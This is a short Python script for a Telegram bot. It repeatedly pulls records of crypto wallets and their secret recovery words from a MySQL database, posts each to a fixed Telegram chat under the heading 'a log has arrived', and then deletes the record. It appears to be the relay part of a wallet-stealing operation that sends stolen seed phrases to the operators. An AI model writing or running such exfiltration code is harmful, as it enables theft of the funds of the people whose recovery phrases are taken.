import telebot
import conf

bot = telebot.TeleBot(conf.TOKEN)

chat_id = -1001607998608

print("start")
while True:
    data_list = conf.MySQL().get_data()
    for data in data_list:
        text = f"♦️Пришел лог♦️\n\n💰Кошелек: ⭕️{data['wallet']}⭕️\n📋Слова: {data['secret']}"
        bot.send_message(chat_id, text)
        conf.MySQL().delete_data(data['id'])